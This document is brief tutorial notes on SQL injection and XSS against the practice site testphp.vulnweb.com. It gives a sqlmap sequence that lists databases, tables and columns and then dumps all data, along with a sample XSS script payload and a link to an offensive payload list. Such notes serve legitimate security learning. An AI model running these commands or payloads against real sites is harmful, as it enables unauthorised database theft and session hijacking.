# SQL INJECTIONS
- testphp.vulnweb.com - Our test site
- In Kali Linux itself we have a tool for sql injections called as sqlmap
- ```sudo apt install sqlmap```
-  man db - manual database
- verbosity -v0----v6.
- OWASP ZAP- An automation tool to find the known vulnerabilities 
- -   **Cross-Site Scripting (XSS):** Attackers inject malicious scripts into websites to steal data or hijack sessions.
- eg-<script>alert('Sumit')</script>
-   **HTML Injections:** Inserting malicious HTML code to manipulate or harm users accessing web pages.
- Repository for payloads- [InfoSecWarrior/Offensive-Payloads: List of payloads and wordlists that are specifically crafted to identify and exploit vulnerabilities in target web applications. (github.com)](https://github.com/InfoSecWarrior/Offensive-Payloads)
- We can add them to BurpSuite and bruteforce 
- We may use different options while using sqlmap
- For the time being we go with ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -dbs```
- (getting info about database)
- union query - a combination of data base
- We get to know about the two databases- acuart and information_schema
- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart --tables```
- from among the table we need to guess which data can be most confidential data(users)
- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --columns```
- Now the hacker will want to download the data by -
- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart --tables --dump-all```
- Keep a note of the location where the file is saved
